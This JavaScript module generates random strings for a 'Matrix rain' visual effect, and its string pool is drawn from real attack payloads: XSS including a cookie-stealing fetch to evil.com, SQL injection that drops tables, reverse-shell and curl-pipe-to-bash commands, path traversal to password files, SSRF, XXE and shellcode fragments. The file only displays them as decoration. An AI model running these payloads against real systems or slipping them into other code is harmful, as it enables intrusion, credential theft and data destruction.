/**
 * Security Payloads for Matrix Rain Effect
 * Add your own payloads to any category below
 */

export const securityPayloads = [
  // ============================================
  // BINARY & HEX
  // ============================================
  () => Array(40).fill(0).map(() => Math.random() > 0.5 ? '1' : '0').join(''),
  () => Array(50).fill(0).map(() => Math.random() > 0.3 ? '1' : '0').join(''),
  () => Array(60).fill(0).map(() => Math.random() > 0.4 ? '1' : '0').join(''),
  () => Array(20).fill(0).map(() => '0x' + Math.floor(Math.random() * 255).toString(16).toUpperCase()).join(' '),
  () => `\\x${Math.floor(Math.random() * 255).toString(16)}\\x${Math.floor(Math.random() * 255).toString(16)}\\x${Math.floor(Math.random() * 255).toString(16)}`,

  // ============================================
  // CVE & VULNERABILITY IDS
  // ============================================
  () => `CVE-${2020 + Math.floor(Math.random() * 6)}-${Math.floor(Math.random() * 99999)}`,
  () => `CVE-${2018 + Math.floor(Math.random() * 8)}-${Math.floor(Math.random() * 99999)} [CRITICAL]`,
  () => `CWE-${Math.floor(Math.random() * 900)}`,
  () => `CVSS:3.1/${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`,

  // ============================================
  // XSS PAYLOADS
  // ============================================
  () => `<script>alert('XSS')</script>`,
  () => `${String.fromCharCode(60)}img src=x onerror=alert(1)${String.fromCharCode(62)}`,
  () => `javascript:alert(document.cookie)`,
  () => `<svg/onload=alert(1)>`,
  () => `<iframe src="javascript:alert(1)">`,
  () => `<body onload=alert('XSS')>`,
  () => `<input autofocus onfocus=alert(1)>`,
  () => `"><script>fetch('http://evil.com?c='+document.cookie)</script>`,

  // ============================================
  // SQL INJECTION
  // ============================================
  () => `' OR '1'='1'--`,
  () => `';DROP TABLE users;--`,
  () => `' UNION SELECT NULL,NULL,NULL--`,
  () => `admin'--`,
  () => `' OR 1=1#`,
  () => `1' AND '1'='1`,
  () => `' UNION SELECT password FROM users--`,
  () => `'; EXEC sp_MSForEachTable 'DROP TABLE ?'--`,
  () => `' OR 'a'='a`,
  () => `1' ORDER BY 10--`,

  // ============================================
  // COMMAND INJECTION
  // ============================================
  () => `; cat /etc/shadow`,
  () => `| nc -e /bin/sh 10.10.10.${Math.floor(Math.random() * 255)} 4444`,
  () => `\`whoami\``,
  () => `$(curl http://evil.com/shell.sh | bash)`,
  () => `; rm -rf /tmp/* ;`,
  () => `| python -c 'import socket,subprocess,os;...'`,

  // ============================================
  // PATH TRAVERSAL
  // ============================================
  () => `../../../etc/passwd`,
  () => `....//....//....//etc/shadow`,
  () => `..\\..\\..\\windows\\system32\\config\\sam`,
  () => `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
  () => `../../../../../../var/www/html/config.php`,

  // ============================================
  // SSRF PAYLOADS
  // ============================================
  () => `http://169.254.169.254/latest/meta-data/`,
  () => `http://localhost:8080/admin`,
  () => `gopher://127.0.0.1:6379/_`,
  () => `file:///etc/passwd`,

  // ============================================
  // XXE PAYLOADS
  // ============================================
  () => `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
  () => `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`,

  // ============================================
  // LDAP INJECTION
  // ============================================
  () => `*)(uid=*))(|(uid=*`,
  () => `admin)(&(password=*))`,

  // ============================================
  // NOSQL INJECTION
  // ============================================
  () => `{"$ne": null}`,
  () => `{"$gt": ""}`,
  () => `'; return true; var dummy='`,

  // ============================================
  // TEMPLATE INJECTION
  // ============================================
  () => `{{7*7}}`,
  () => `\${7*7}`,
  () => `<%= 7*7 %>`,
  () => `{{config.items()}}`,

  // ============================================
  // ASSEMBLY CODE
  // ============================================
  () => `MOV EAX, [EBP+8]`,
  () => `PUSH EBP`,
  () => `JMP 0x${Math.floor(Math.random() * 0xFFFF).toString(16)}`,
  () => `XOR RAX, RAX`,
  () => `LEA RDI, [RIP+0x${Math.floor(Math.random() * 255).toString(16)}]`,
  () => `CALL ${(0x401000 + Math.floor(Math.random() * 0xFFFF)).toString(16)}`,
  () => `POP RBP; RET`,
  () => `ADD RSP, 0x${Math.floor(Math.random() * 255).toString(16)}`,
  () => `CMP BYTE PTR [RBX], 0x${Math.floor(Math.random() * 255).toString(16)}`,
  () => `TEST EAX, EAX`,
  () => `JNZ 0x${Math.floor(Math.random() * 0xFFFF).toString(16)}`,
  () => `INT 0x80`,
  () => `SYSCALL`,
  () => `MOV QWORD PTR [RBP-0x${Math.floor(Math.random() * 255).toString(16)}], RAX`,
  () => `SUB RSP, 0x${Math.floor(Math.random() * 512).toString(16)}`,

  // ============================================
  // KERNEL CODE
  // ============================================
  () => `kmalloc(${Math.floor(Math.random() * 512)}, GFP_KERNEL)`,
  () => `struct task_struct *task`,
  () => `__init void setup_${Math.random() > 0.5 ? 'irq' : 'cpu'}()`,
  () => `printk(KERN_INFO "0x%lx", ptr)`,
  () => `copy_from_user(buf, user_buf, count)`,
  () => `kfree(ptr); /* 0x${Math.floor(Math.random() * 0xFFFFFFFF).toString(16)} */`,
  () => `mutex_lock(&dev->lock)`,
  () => `do_fork(CLONE_VM|CLONE_FS, 0)`,
  () => `sys_read(fd, buf, ${Math.floor(Math.random() * 4096)})`,
  () => `schedule_timeout(HZ * ${Math.floor(Math.random() * 10)})`,

  // ============================================
  // REVERSE ENGINEERING
  // ============================================
  () => `.text:${(0x400000 + Math.floor(Math.random() * 0xFFFF)).toString(16)}`,
  () => `call sub_${Math.floor(Math.random() * 0xFFFF).toString(16)}`,
  () => `ret ; 0x${Math.floor(Math.random() * 255).toString(16)}`,
  () => `lea rax, unk_${Math.floor(Math.random() * 0xFFFF).toString(16)}`,
  () => `.data:${(0x600000 + Math.floor(Math.random() * 0xFFFF)).toString(16)}`,
  () => `jmp loc_${Math.floor(Math.random() * 0xFFFF).toString(16)}`,
  () => `; __fastcall sub_${Math.floor(Math.random() * 0xFFFF).toString(16)}`,
  () => `dd offset unk_${Math.floor(Math.random() * 0xFFFF).toString(16)}`,

  // ============================================
  // SECURITY TOOLS & COMMANDS
  // ============================================
  () => `nc -lvnp ${4000 + Math.floor(Math.random() * 1000)}`,
  () => `grep -r "password" /var/www/`,
  () => `nmap -sV 192.168.1.${Math.floor(Math.random() * 255)}`,
  () => `python3 exploit.py --target`,
  () => `chmod +x /tmp/.hidden`,
  () => `sudo -l | grep NOPASSWD`,
  () => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.${Math.floor(Math.random() * 255)}`,
  () => `curl http://evil.com/shell.sh | sh`,
  () => `find / -perm -4000 2>/dev/null`,
  () => `base64 -d <<< "$(cat exploit.b64)"`,
  () => `objdump -d /bin/ls | grep -A 20 main`,
  () => `strace -p ${1000 + Math.floor(Math.random() * 9000)}`,
  () => `gdb -q ./vulnerable --args AAAA`,
  () => `tcpdump -i eth0 -n port ${Math.floor(Math.random() * 65535)}`,

  // ============================================
  // SHELLCODE & EXPLOITS
  // ============================================
  () => `\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68`,
  () => `NOP sled: \\x90\\x90\\x90\\x90\\x90\\x90`,
  () => `ret2libc: system@plt + 0x${Math.floor(Math.random() * 0xFFFF).toString(16)}`,
  () => `ROP gadget: pop rdi; ret @ 0x${Math.floor(Math.random() * 0xFFFFFF).toString(16)}`,
  () => `Stack pivot: xchg rax, rsp; ret`,

  // ============================================
  // HASHES & CRYPTOGRAPHY
  // ============================================
  () => `MD5: ${Array(32).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}`,
  () => `SHA256: ${Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}`,
  () => `$6$rounds=${Math.floor(Math.random() * 10000)}$`,
  () => `RSA-${Math.random() > 0.5 ? '2048' : '4096'}`,

  // ============================================
  // MEMORY & POINTERS
  // ============================================
  () => `[RSP+0x${Math.floor(Math.random() * 255).toString(16)}]`,
  () => `*ptr = 0x${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}`,
  () => `EIP: 0x${(0x400000 + Math.floor(Math.random() * 0xFFFF)).toString(16)}`,
  () => `heapspray: 0x0c0c0c0c`,
  () => `libc_base + 0x${Math.floor(Math.random() * 0xFFFFF).toString(16)}`,

  // ============================================
  // DESERIALIZATION
  // ============================================
  () => `O:8:"stdClass":1:{s:4:"eval";s:10:"phpinfo();";}`,
  () => `pickle.loads(base64.b64decode('...'))`,
  () => `java.lang.Runtime.getRuntime().exec("calc")`,

  // ============================================
  // BUFFER OVERFLOW & FORMAT STRINGS
  // ============================================
  () => `AAAA${Array(100).fill('A').join('')}`,
  () => `%p%p%p%p%p%p%p%p`,
  () => `%${Math.floor(Math.random() * 1000)}$s`,

  // ============================================
  // ADD YOUR CUSTOM PAYLOADS BELOW
  // ============================================
  // Example:
  // () => `your custom payload here`,
  // () => `another payload`,
];

/**
 * Get a random security payload
 */
export const getRandomPayload = () => {
  const payloadGenerator = securityPayloads[Math.floor(Math.random() * securityPayloads.length)];
  return payloadGenerator();
};
